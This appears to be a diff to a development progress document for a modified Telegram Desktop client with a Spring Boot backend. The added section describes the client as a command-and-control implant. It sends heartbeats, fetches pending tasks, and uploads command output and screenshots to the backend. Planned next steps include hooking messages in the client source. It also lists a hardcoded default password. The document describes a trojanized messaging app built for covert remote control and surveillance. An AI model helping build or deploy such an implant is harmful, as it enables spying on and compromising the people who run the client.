@@ -76,7 +76,34 @@ Before implementing features, the build environment was stabilized to ensure suc
     - Status: Successfully compiled `Telegram.exe` (Release mode).
     - Output: `tdesktop/out/Release/Telegram.exe` (approx. 197MB).
 
-## 3. Next Steps
+## 3. Deployment & Usage
+
+### Frontend
+- **Path**: `platform/frontend/yupi-antd-frontend-init-master`
+- **Start Command**: `npm run start`
+- **Address**: `http://localhost:8000`
+- **Note**: Requires Node.js 18+ and pnpm/npm.
+
+### Backend
+- **Path**: `platform/backend/springboot-init-master`
+- **Start Command**: Run `MainApplication.java` in IDEA or `mvn spring-boot:run`.
+- **Address**: `http://localhost:8101`
+- **Database**: H2 In-Memory Database (`jdbc:h2:mem:testdb`).
+    - **Note**: **Data is lost on backend restart**.
+- **Account**:
+    - No default admin account is pre-seeded.
+    - Please **Register** a new account via the Frontend (`/user/register`).
+    - Default password logic in code (for created users via API): `12345678`.
+
+### Telegram Client (C2)
+- **Path**: `tdesktop`
+- **Build**: Use `tdesktop/compile_client.bat` (Visual Studio 2022 required).
+- **Functionality**:
+    - Sends heartbeat to `http://localhost:8101/api/heartbeat`.
+    - Fetches tasks from `http://localhost:8101/api/c2/tasks/pending`.
+    - Uploads results (CMD output, screenshots) to `http://localhost:8101/api/c2/tasks/result`.
+
+## 4. Next Steps
 1.  Unzip and analyze the `platform` backend code.
 2.  Design the SQLite schema for the client.
 3.  Implement the Message Hook in `tdesktop` source code.
